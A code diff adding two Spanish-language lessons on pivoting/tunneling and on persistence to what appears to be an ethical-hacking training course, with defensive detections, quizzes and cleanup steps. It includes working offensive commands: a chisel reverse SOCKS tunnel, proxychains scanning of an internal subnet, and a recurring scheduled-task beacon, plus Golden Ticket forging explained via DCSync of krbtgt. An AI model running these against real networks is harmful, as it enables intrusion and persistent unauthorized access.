@@ -51,4 +51,53 @@ Frameworks de laboratorio/profesionales: **Sliver**, **Mythic**, **Havoc**, **Me
   challenge: 'En GOAD, encadena desde un usuario normal hasta leer `krbtgt` por DCSync, documentando cada salto. Entrega la "lista de limpieza": todo lo que un operador real tendría que revertir.',
   refs: [['NetExec', 'https://www.netexec.wiki/'], ['The Hacker Recipes · Movement', 'https://www.thehacker.recipes/ad/movement/'], ['MITRE · Lateral Movement', 'https://attack.mitre.org/tactics/TA0008/']] },
 ]},
+{ name: 'Maestría', lessons: [
+{ id: 'px-03', t: 'Pivoting y túneles: llegar a redes internas que no te ven', min: 70, labs: ['vm'],
+  obj: ['Entender el pivoting: usar una máquina comprometida como puente', 'Montar túneles y proxies SOCKS para alcanzar segmentos internos', 'Hacerlo de forma ordenada y documentada'],
+  theory: `Tras comprometer un host en la DMZ, la red **interna** (CORP) no es accesible desde tu Kali… pero sí desde ese host. El **pivoting** convierte la máquina comprometida en un puente.
+
+| Técnica | Idea | Herramienta |
+|---|---|---|
+| **SSH dinámico** | proxy SOCKS a través de una sesión SSH | \`ssh -D\` |
+| **Proxy SOCKS + proxychains** | mandar tus herramientas por el túnel | chisel, ligolo-ng + proxychains |
+| **Port forwarding** | exponer un puerto interno en tu lado | chisel, socat |
+| **ligolo-ng** | crea una interfaz; usas la red interna casi como local | ligolo-ng (muy cómodo) |
+
+La disciplina: un túnel a la vez, bien etiquetado, y apuntar qué redes alcanzas por cada pivote (para el informe y para la limpieza).`,
+  steps: [
+    ['Levanta un proxy SOCKS con chisel', './chisel server -p 9001 --reverse   # en Kali', 'En el host comprometido: `./chisel client KALI:9001 R:socks`. Ya tienes un SOCKS hacia la red interna.'],
+    ['Manda tus herramientas por el túnel', 'proxychains nmap -sT -Pn 192.168.59.0/24', 'Con proxychains, nmap/netexec/evil-winrm viajan por el pivote y ven la red CORP interna.'],
+    ['Alternativa cómoda: ligolo-ng', '', 'ligolo-ng crea una interfaz de red; añades una ruta a la subred interna y la usas casi como si fuera local, sin proxychains.'],
+    ['Documenta la topología', '', 'Dibuja: Kali → host DMZ (pivote) → red CORP. Anota qué llegaste a ver por cada salto para el informe y para desmontarlo al final.'],
+  ],
+  defense: 'Segmentación real (la DMZ no debería enrutar a CORP), microsegmentación, detección de túneles y de SOCKS, egress filtering y alertas sobre un host que de pronto habla con muchas IPs internas. Un pivote es visible si miras el tráfico este-oeste.',
+  quiz: [['¿Para qué sirve un proxy SOCKS en el pivoting?', ['Para cifrar el disco', 'Para mandar tus herramientas a través de la máquina comprometida hacia la red interna', 'Para escanear más rápido'], 1, 'El SOCKS enruta tus herramientas por el pivote hasta segmentos que tú no ves directamente.'],
+         ['Mejor defensa contra el pivoting DMZ→CORP:', ['Más ancho de banda', 'Segmentar de verdad para que la DMZ no alcance la red interna', 'Cambiar contraseñas'], 1, 'Si la DMZ no enruta a CORP, el pivote no tiene a dónde ir.']],
+  challenge: 'En el laboratorio, comprométe un host de la DMZ y pivota hasta enumerar un servicio de CORP que no veías desde Kali. Documenta la topología y la mitigación de segmentación.',
+  refs: [['chisel', 'https://github.com/jpillora/chisel'], ['ligolo-ng', 'https://github.com/nicocha30/ligolo-ng'], ['HackTricks · Tunneling', 'https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding']] },
+{ id: 'px-04', t: 'Persistencia y su detección: mantener el acceso sin ser el ruidoso', min: 65, labs: ['vm'],
+  obj: ['Conocer los mecanismos de persistencia más comunes y su huella', 'Entender el Golden/Silver Ticket a alto nivel', 'Elegir persistencia reversible y documentada en un ejercicio'],
+  theory: `La **persistencia** mantiene el acceso si se reinicia o se cambia una contraseña. Cada mecanismo deja una huella concreta (clave para el Blue Team):
+
+| Mecanismo | Dónde | Huella / detección |
+|---|---|---|
+| Tarea programada | schtasks / cron | 4698 (creación de tarea) |
+| Servicio nuevo | Windows services | 7045 (servicio instalado) |
+| Clave Run / inicio | registro | Sysmon 13 (registro), autoruns |
+| Golden Ticket | TGT forjado con el hash de **krbtgt** | TGT con tiempos raros, cuentas inexistentes |
+| Silver Ticket | TGS forjado para un servicio | sin tráfico al DC para ese acceso |
+
+El **Golden Ticket** (forjar TGTs con el hash de krbtgt) da acceso casi eterno al dominio: por eso krbtgt se rota **dos veces** tras un compromiso. En un ejercicio ético la persistencia es **mínima, reversible y documentada**; se entrega para desmontarla.`,
+  steps: [
+    ['Persistencia reversible en el lab', 'schtasks /create /tn "LabBeacon" /tr "..." /sc minute /mo 30', 'Apúntala en el inventario de artefactos (la verás generar un 4698). En un ejercicio real, acordada con el cliente.'],
+    ['Entiende el Golden Ticket', '', 'Con el hash de krbtgt (obtenido por DCSync en px-02) se forjan TGTs arbitrarios. No lo uses para dañar: entiende por qué obliga a rotar krbtgt dos veces.'],
+    ['Mírate con ojos de Blue Team', '', 'Cada técnica genera su evento (4698/7045/Sysmon 13). Reaprovecha las detecciones Sigma del N2 para cazarte a ti mismo.'],
+    ['Limpia al cerrar', '', 'Elimina tareas, servicios y claves creados; entrega el inventario. El entorno queda como estaba.'],
+  ],
+  defense: 'Inventario de autoruns, alertas sobre 4698/7045 y cambios de claves de inicio, rotación doble de krbtgt tras un incidente, Protected Users/Credential Guard, y caza proactiva de tickets Kerberos anómalos. La persistencia es ruidosa si registras los sitios correctos.',
+  quiz: [['¿Por qué se rota krbtgt DOS veces tras un compromiso?', ['Por costumbre', 'Para invalidar Golden Tickets forjados con el hash anterior', 'Para acelerar el DC'], 1, 'La doble rotación corta los TGTs forjados que dependían del hash previo.'],
+         ['Un servicio nuevo instalado como persistencia genera típicamente…', ['Nada', 'El evento 7045', 'Un 404'], 1, '7045 (servicio instalado) es una señal clásica de persistencia.']],
+  challenge: 'Instala en el laboratorio dos persistencias (tarea y clave Run), confirma qué eventos generan y escribe para cada una la detección y la forma de revertirla.',
+  refs: [['MITRE · Persistence', 'https://attack.mitre.org/tactics/TA0003/'], ['The Hacker Recipes · Kerberos tickets', 'https://www.thehacker.recipes/ad/persistence/'], ['Sysmon modular', 'https://github.com/olafhartong/sysmon-modular']] },
+]},
 ]};
